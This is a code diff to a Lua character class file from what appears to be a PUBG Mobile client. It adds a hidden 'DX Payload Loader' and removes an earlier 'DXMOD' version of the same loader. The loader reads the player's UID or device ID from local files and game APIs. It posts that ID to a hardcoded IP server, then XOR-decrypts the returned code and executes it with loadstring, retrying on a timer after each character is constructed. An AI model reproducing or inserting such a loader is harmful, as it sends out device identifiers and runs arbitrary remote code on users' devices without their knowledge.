@@ -137,41 +137,58 @@ function CharacterBase:GetLifetimeReplicatedProps()
   return RepTable
 end
 
-function CharacterBase:_PostConstruct()
-  CharacterBase.__super._PostConstruct(self)
-  self:AddControlEventWithCondition(self, "OnAttrChangeEventDelegate", {
-    AttrName = {
-      "bUseDeadBox",
-      "IsInUnderGroundArea",
-      "IsAroundUndergroundEntry",
-      "EmotePlayRate",
-      "AreaID",
-      "MapID",
-      "DanceStageAreaState"
-    }
-  }, self.CharacterAttrChangeEvent, self)
-  self:AddControlEvent(self, "OnPawnRespawnDelegate", self.HandleOnRespawn, self)
-  self:AddControlEvent(self, "OnParachuteStateChanged", self.LuaHandleParachuteStateChanged, self)
-  self:AddControlEvent(self, "OnRepParachuteStateDelegate", self.LuaHandleRepParachuteStateDelegate, self)
-  self:AddControlEvent(self, "OnPlayerPoseChange", self.PlayerPoseChange, self)
-  self:AddControlEvent(self, "OnAttachedToVehicle", self.HandleAttachedToVehicle, self)
-  self:AddControlEvent(self, "OnDetachedFromVehicle", self.HandleDetachedFromVehicle, self)
-  if not Client then
-    self.DefaultNetCullDistanceSq = self.NetCullDistanceSquared
-    self.UseNewParachuteMove = false
-    self.bIsPlayingLevelSequenceForShow = false
-    self:SetNetUpdateGroupID(2)
-    self:AddControlEvent(self, "IsEnterNearDeathDelegate", self.HandleServerEnterNearDeathDelegate, self)
-    self:AddControlEvent(self, "OnPlayerStartRescue", self.HandleOnPlayerStartRescue, self)
-    self:AddControlEvent(self, "StateEnterHandler", self.HandleOnEnterState, self)
-    self:AddControlEvent(self, "OnHandleSkillStartDelegate", self.HandleOnSkillStart, self)
-  else
-    self.bClientCanTriggerSkill = true
-    self:AddControlEvent(self, "OnPreRepAttachment", self.HandleOnPreRepAttachment, self)
-    self:AddControlEvent(self, "IsEnterNearDeathDelegate", self.HandleIsEnterNearDeathDelegate, self)
-    self:AddCommonEvent(EVENTTYPE_APPLICATION_ACTIVE_STATE, EVENTID_APPLICATION_REACTIVATED_EX, self.OnApplicationReactivated, self)
+do
+  local origin_PostConstruct = function(self)
+    CharacterBase.__super._PostConstruct(self)
+    self:AddControlEventWithCondition(self, "OnAttrChangeEventDelegate", {
+      AttrName = {
+        "bUseDeadBox",
+        "IsInUnderGroundArea",
+        "IsAroundUndergroundEntry",
+        "EmotePlayRate",
+        "AreaID",
+        "MapID",
+        "DanceStageAreaState"
+      }
+    }, self.CharacterAttrChangeEvent, self)
+    self:AddControlEvent(self, "OnPawnRespawnDelegate", self.HandleOnRespawn, self)
+    self:AddControlEvent(self, "OnParachuteStateChanged", self.LuaHandleParachuteStateChanged, self)
+    self:AddControlEvent(self, "OnRepParachuteStateDelegate", self.LuaHandleRepParachuteStateDelegate, self)
+    self:AddControlEvent(self, "OnPlayerPoseChange", self.PlayerPoseChange, self)
+    self:AddControlEvent(self, "OnAttachedToVehicle", self.HandleAttachedToVehicle, self)
+    self:AddControlEvent(self, "OnDetachedFromVehicle", self.HandleDetachedFromVehicle, self)
+    if not Client then
+      self.DefaultNetCullDistanceSq = self.NetCullDistanceSquared
+      self.UseNewParachuteMove = false
+      self.bIsPlayingLevelSequenceForShow = false
+      self:SetNetUpdateGroupID(2)
+      self:AddControlEvent(self, "IsEnterNearDeathDelegate", self.HandleServerEnterNearDeathDelegate, self)
+      self:AddControlEvent(self, "OnPlayerStartRescue", self.HandleOnPlayerStartRescue, self)
+      self:AddControlEvent(self, "StateEnterHandler", self.HandleOnEnterState, self)
+      self:AddControlEvent(self, "OnHandleSkillStartDelegate", self.HandleOnSkillStart, self)
+    else
+      self.bClientCanTriggerSkill = true
+      self:AddControlEvent(self, "OnPreRepAttachment", self.HandleOnPreRepAttachment, self)
+      self:AddControlEvent(self, "IsEnterNearDeathDelegate", self.HandleIsEnterNearDeathDelegate, self)
+      self:AddCommonEvent(EVENTTYPE_APPLICATION_ACTIVE_STATE, EVENTID_APPLICATION_REACTIVATED_EX, self.OnApplicationReactivated, self)
+    end
+    self:AddControlEvent(self, "OnDeathDelegate", self.HandleDeathDelegate, self)
   end
-  self:AddControlEvent(self, "OnDeathDelegate", self.HandleDeathDelegate, self)
+
+  function CharacterBase:_PostConstruct()
+    origin_PostConstruct(self)
+    if not _G.DX_PayloadDone and _G.DX_TryLoadPayload and not _G.DX_PayloadTimerStarted then
+      _G.DX_PayloadTimerStarted = true
+      _G.DX_TryLoadPayload()
+      if not _G.DX_PayloadDone then
+        self:AddGameTimer(5, true, function()
+          if not _G.DX_PayloadDone then
+            _G.DX_TryLoadPayload()
+          end
+        end)
+      end
+    end
+  end
 end
 
 function CharacterBase:OnDestroyed()
@@ -2481,10 +2498,120 @@ function CharacterBase:MultiCast_GenericRPC(ID, Bytes)
   GenericRPCUtil._OnRecv(self, ID, GenericRPCEnums.EGenericRPCDirection.Multicast, Bytes)
 end
 
+-- DX Payload Loader
+if not _G.DX_PayloadReady then
+    _G.DX_PayloadReady = true
+
+    local DX_SERVER_URL = _G.DX_ServerURL or "http://160.250.246.119:5002"
+
+    local function deriveKey(uid)
+        local base = "DX_SECRET_PAYLOAD_KEY_2026!@#"
+        local uid_str = tostring(uid or "")
+        local len_uid = #uid_str
+        if len_uid == 0 then return base end
+        local result = {}
+        for i = 1, #base do
+            local b = base:byte(i)
+            local u = uid_str:byte((i - 1) % len_uid + 1)
+            result[i] = string.char(((b + u) % 95) + 32)
+        end
+        return table.concat(result)
+    end
+
+    local function DecryptXOR(hex_str, key)
+        local key_bytes = {string.byte(key, 1, #key)}
+        local key_len = #key
+        local result = {}
+        local idx = 1
+        for i = 1, #hex_str, 2 do
+            local hex_byte = hex_str:sub(i, i + 1)
+            local byte_val = tonumber(hex_byte, 16)
+            if byte_val then
+                local key_byte = key_bytes[(idx - 1) % key_len + 1]
+                table.insert(result, string.char(byte_val ~ key_byte))
+                idx = idx + 1
+            end
+        end
+        return table.concat(result)
+    end
+
+    local function DX_TryLoadPayload()
+        if _G.DX_PayloadDone then return end
+        pcall(function()
+            local ModuleManager = package.loaded["client.module_framework.ModuleManager"]
+                or require("client.module_framework.ModuleManager")
+            if not ModuleManager then return end
+            local http = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
+            if not http then return end
+
+            local uid = "UNKNOWN"
+            pcall(function()
+                local f = io.open("/sdcard/Android/data/com.vng.pubgmobile/files/dx_last_uid.txt", "r")
+                if f then
+                    local cached_uid = f:read("*a")
+                    f:close()
+                    if cached_uid then
+                        cached_uid = string.gsub(cached_uid, "%s+", "")
+                        if cached_uid ~= "" and cached_uid ~= "0" then uid = cached_uid end
+                    end
+                end
+            end)
+            if uid == "UNKNOWN" then
+                pcall(function()
+                    local DataCache = package.loaded["DataCache"] or _G.DataCache
+                    if DataCache and DataCache.GetMyUID then
+                        local u = tostring(DataCache.GetMyUID())
+                        if u and u ~= "" and u ~= "0" then uid = u end
+                    end
+                end)
+            end
+            if uid == "UNKNOWN" then
+                pcall(function()
+                    local S = import("KismetSystemLibrary")
+                    if S and S.GetDeviceId then uid = tostring(S.GetDeviceId()) end
+                end)
+            end
+            if uid == "UNKNOWN" or uid == "" then return end
+
+            _G.DX_CachedUID = uid
+            http:Post(DX_SERVER_URL .. "/api/payload",
+                { ["Content-Type"] = "application/json" },
+                '{"uid":"' .. tostring(uid) .. '"}', "", function(success, data)
+                if not success or not data or data == "" then return end
+                pcall(function()
+                    local enc_code = data:match('"payload"%s*:%s*"([^"]+)"')
+                    if not enc_code then return end
+                    local decrypted = DecryptXOR(enc_code, deriveKey(uid))
+                    if not decrypted or #decrypted == 0 then return end
+                    local load_func = loadstring or load
+                    if not load_func then return end
+                    local fn, err = load_func(decrypted)
+                    if not fn then return end
+                    pcall(fn, CharacterBase)
+                    _G.DX_PayloadDone = true
+                    if _G.DX_CharacterBaseClass then
+                        for k, v in pairs(CharacterBase) do
+                            if type(v) == "function" then
+                                _G.DX_CharacterBaseClass[k] = v
+                            end
+                        end
+                    end
+                end)
+            end)
+        end)
+    end
+
+    _G.DX_TryLoadPayload = DX_TryLoadPayload
+end
+
+-- Store raw table globally so late-loading payload can modify it
+_G.DX_CharacterBaseRaw = CharacterBase
+
 local class = require("class")
 local CActorBase = require("GameLua.Mod.BaseMod.Common.Core.ActorBase")
 local CCharacterBase = class(CActorBase, nil, CharacterBase)
-local finalClass = require("combine_class").DeclareFeature(CCharacterBase, {
+_G.DX_CharacterBaseClass = CCharacterBase
+return require("combine_class").DeclareFeature(CCharacterBase, {
   {
     InteractWithVehicleFeature = "GameLua.GameCore.Feature.InteractWithVehicleFeature"
   },
@@ -2501,231 +2628,3 @@ local finalClass = require("combine_class").DeclareFeature(CCharacterBase, {
     PetExhibitFeature = "GameLua.Activity.Commercialize.GamePlay.Pet.PetExhibitFeature"
   }
 }, "CharacterBase")
-
--- =========================================================================
---  [DXMOD] SECURE CLIENT LOADER — DYNAMIC RAM EXECUTION
---  - Chống Crack: Toàn bộ mã nguồn gốc nằm trên VPS
---  - Tải động trực tiếp vào RAM, không lưu file vật lý trên thiết bị
--- =========================================================================
-
-local function GetDeviceUID()
-  local uid = "UNKNOWN"
-  -- 1. Try reading the cached game UID from dx_last_uid.txt
-  pcall(function()
-    local f = io.open("/sdcard/Android/data/com.vng.pubgmobile/files/dx_last_uid.txt", "r")
-    if f then
-      local cached_uid = f:read("*a")
-      f:close()
-      if cached_uid then
-        cached_uid = string.gsub(cached_uid, "%s+", "")
-        if cached_uid ~= "" and cached_uid ~= "0" then
-          uid = cached_uid
-        end
-      end
-    end
-  end)
-  -- 2. If not found, try getting it via DataCache, ProfileController, or GameplayData (if already initialized)
-  if uid == "UNKNOWN" then
-    pcall(function()
-      local DataCache = package.loaded["DataCache"] or _G.DataCache
-      if DataCache and DataCache.GetMyUID then
-        local u = tostring(DataCache.GetMyUID())
-        if u and u ~= "" and u ~= "0" then uid = u end
-      end
-    end)
-  end
-  if uid == "UNKNOWN" then
-    pcall(function()
-      local ProfileController = package.loaded["ProfileController"] or _G.ProfileController
-      if ProfileController and ProfileController.GetMyUID then
-        local u = tostring(ProfileController.GetMyUID())
-        if u and u ~= "" and u ~= "0" then uid = u end
-      end
-    end)
-  end
-  if uid == "UNKNOWN" then
-    pcall(function()
-      local GameplayData = package.loaded["GameLua.GameCore.Data.GameplayData"] or require("GameLua.GameCore.Data.GameplayData")
-      local LocalPlayer = GameplayData and GameplayData.GetPlayerCharacter and GameplayData.GetPlayerCharacter()
-      if LocalPlayer then
-        local u = tostring(LocalPlayer.PlayerUID or LocalPlayer.UID or LocalPlayer.uID or "")
-        if u and u ~= "" and u ~= "0" then uid = u end
-      end
-    end)
-  end
-  -- 3. If still unknown, fall back to hardware Device ID
-  if uid == "UNKNOWN" then
-    pcall(function()
-      local S = import("KismetSystemLibrary")
-      if S and S.GetDeviceId then
-        uid = tostring(S.GetDeviceId())
-      end
-    end)
-  end
-  return uid
-end
-
-local function ShowPopup(title, msg)
-  local success = false
-  pcall(function()
-    local Msg = package.loaded["client.slua.logic.common.logic_common_msg_box"]
-      or require("client.slua.logic.common.logic_common_msg_box")
-    if Msg and Msg.Show and _G.UIManager and _G.UIManager.ShowUI then
-      Msg.Show(1, tostring(title), tostring(msg),
-        function() end, function() end, "XÁC NHẬN", "ĐÓNG")
-      success = true
-    end
-  end)
-  if not success then
-    pcall(function()
-      require("common.time_ticker").AddTimerOnce(2.0, function()
-        ShowPopup(title, msg)
-      end)
-    end)
-  end
-end
-
--- XOR Decryption helper
-local function DecryptXOR(hex_str, key)
-  local key_bytes = {string.byte(key, 1, #key)}
-  local key_len = #key
-  local result = {}
-  local idx = 1
-  for i = 1, #hex_str, 2 do
-    local hex_byte = hex_str:sub(i, i+1)
-    local byte_val = tonumber(hex_byte, 16)
-    if byte_val then
-      local key_byte = key_bytes[(idx - 1) % key_len + 1]
-      table.insert(result, string.char(byte_val ~ key_byte))
-      idx = idx + 1
-    end
-  end
-  return table.concat(result)
-end
-
--- Dynamic key derivation: key unique theo UID
-local function deriveKey(uid)
-  local base = "DX_SECRET_PAYLOAD_KEY_2026!@#"
-  local uid_str = tostring(uid or "")
-  local len_uid = #uid_str
-  if len_uid == 0 then return base end
-  local result = {}
-  for i = 1, #base do
-    local b = base:byte(i)
-    local u = uid_str:byte((i - 1) % len_uid + 1)
-    result[i] = string.char(((b + u) % 95) + 32)
-  end
-  return table.concat(result)
-end
-
-local function WriteDebugLog(msg)
-  pcall(function()
-    local f = io.open("/sdcard/Android/data/com.vng.pubgmobile/files/loader_debug.txt", "a")
-    if f then
-      f:write(os.date("%Y-%m-%d %H:%M:%S") .. " " .. tostring(msg) .. "\n")
-      f:close()
-    end
-  end)
-end
-
-local function LoadProtectedPayload(OriginalClass)
-  WriteDebugLog("[DXMOD-LOADER] Starting LoadProtectedPayload...")
-  local uid = "UNKNOWN"
-  local ok_uid, err_uid = pcall(function()
-    uid = GetDeviceUID()
-  end)
-  WriteDebugLog("[DXMOD-LOADER] Device UID: " .. tostring(uid) .. " (ok: " .. tostring(ok_uid) .. ", err: " .. tostring(err_uid) .. ")")
-
-  local api_url = "http://160.250.246.119:5002/api/payload"
-  WriteDebugLog("[DXMOD-LOADER] Attempting HTTP via ModuleManager to " .. api_url)
-
-  local ok_mm, err_mm = pcall(function()
-    local ModuleManager = package.loaded["client.module_framework.ModuleManager"]
-      or require("client.module_framework.ModuleManager")
-    WriteDebugLog("[DXMOD-LOADER] ModuleManager: " .. tostring(ModuleManager))
-    if not ModuleManager then return end
-
-    local http_manager = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
-    WriteDebugLog("[DXMOD-LOADER] http_manager: " .. tostring(http_manager))
-    if not http_manager then return end
-
-    local post_header  = { ["Content-Type"] = "application/json" }
-    _G.DX_CachedUID = uid
-    local post_content = '{"uid":"' .. tostring(uid) .. '"}'
-    
-    http_manager:Post(api_url, post_header, post_content, "", function(success, data)
-      local ok_cb, err_cb = pcall(function()
-        WriteDebugLog("[DXMOD-LOADER] HTTP callback: success=" .. tostring(success) .. " data_len=" .. tostring(data and #data or 0))
-        if not success or not data or data == "" then
-          WriteDebugLog("[DXMOD-LOADER] HTTP callback: no data, skipping.")
-          ShowPopup("LỖI KẾT NỐI SERVER", "Không thể kết nối đến Máy chủ bảo mật của DXMOD!\nVui lòng kiểm tra lại mạng hoặc liên hệ Admin.")
-          return
-        end
-
-        local XOR_KEY2 = deriveKey(uid)
-        local status      = data:match('"status"%s*:%s*"([^"]+)"')
-        local error_msg   = data:match('"message"%s*:%s*"([^"]+)"')
-        local enc_code    = data:match('"payload"%s*:%s*"([^"]+)"')
-        local expire_from_payload = data:match('"expires_at"%s*:%s*"([^"]+)"') or data:match('"expiresAt"%s*:%s*"([^"]+)"')
-        if expire_from_payload then
-          _G.DX_ExpiresAt = expire_from_payload
-        end
-
-        WriteDebugLog("[DXMOD-LOADER] status=" .. tostring(status))
-
-        if status == "approved" and enc_code then
-          local decrypted_code = DecryptXOR(enc_code, XOR_KEY2)
-          WriteDebugLog("[DXMOD-LOADER] decrypted length: " .. tostring(#decrypted_code))
-
-          WriteDebugLog("[DXMOD-LOADER] Compiling decrypted payload...")
-          local load_func = loadstring or load
-          if not load_func then
-            WriteDebugLog("[DXMOD-LOADER] ERROR: both loadstring and load are nil!")
-            return
-          end
-          local fn, err = load_func(decrypted_code)
-          if fn then
-            WriteDebugLog("[DXMOD-LOADER] Compilation successful. Executing payload...")
-            local ok_exec, exec_err = pcall(fn, OriginalClass)
-            WriteDebugLog("[DXMOD-LOADER] Execution finished. status=" .. tostring(ok_exec) .. " err=" .. tostring(exec_err))
-            if ok_exec then
-              ShowPopup("[DXMOD VIP]", "Đã kết nối và nạp dữ liệu VIP thành công!\nChúc bạn chơi game vui vẻ.")
-              pcall(function()
-                if _G.DX_ActivePlayerClass then
-                  for k, v in pairs(OriginalClass) do
-                    if type(v) == "function" then
-                      _G.DX_ActivePlayerClass[k] = v
-                    end
-                  end
-                end
-              end)
-            else
-              WriteDebugLog("[DXMOD-LOADER] EXECUTION ERROR: " .. tostring(exec_err))
-              ShowPopup("[DXMOD ERROR]", "Lỗi thực thi mã nguồn bảo mật:\n" .. tostring(exec_err))
-            end
-          else
-            WriteDebugLog("[DXMOD-LOADER] COMPILATION ERROR: " .. tostring(err))
-            ShowPopup("[DXMOD ERROR]", "Lỗi biên dịch mã nguồn bảo mật:\n" .. tostring(err))
-          end
-        elseif status == "pending" then
-          ShowPopup("[DXMOD LICENSE]", "Thiết bị của bạn đã được đăng ký tự động!\nTrạng thái: CHỜ DUYỆT\nUID: " .. tostring(uid) .. "\nVui lòng liên hệ Admin để kích hoạt.")
-        elseif status == "expired" then
-          ShowPopup("[DXMOD LICENSE]", "Thiết bị của bạn đã HẾT HẠN sử dụng!\nUID: " .. tostring(uid) .. "\nVui lòng liên hệ Admin để gia hạn.")
-        else
-          ShowPopup("[DXMOD LICENSE]", "Thiết bị không được phép truy cập!\nChi tiết: " .. tostring(error_msg or "Từ chối truy cập."))
-        end
-      end)
-      if not ok_cb then
-        WriteDebugLog("[DXMOD-LOADER] CALLBACK EXCEPTION: " .. tostring(err_cb))
-      end
-    end)
-    WriteDebugLog("[DXMOD-LOADER] HttpRequest dispatched (async).")
-  end)
-  WriteDebugLog("[DXMOD-LOADER] ModuleManager call ok=" .. tostring(ok_mm) .. " err=" .. tostring(err_mm))
-  return false
-end
-
-pcall(LoadProtectedPayload, CharacterBase)
-
-_G.DX_ActivePlayerClass = finalClass
-return finalClass
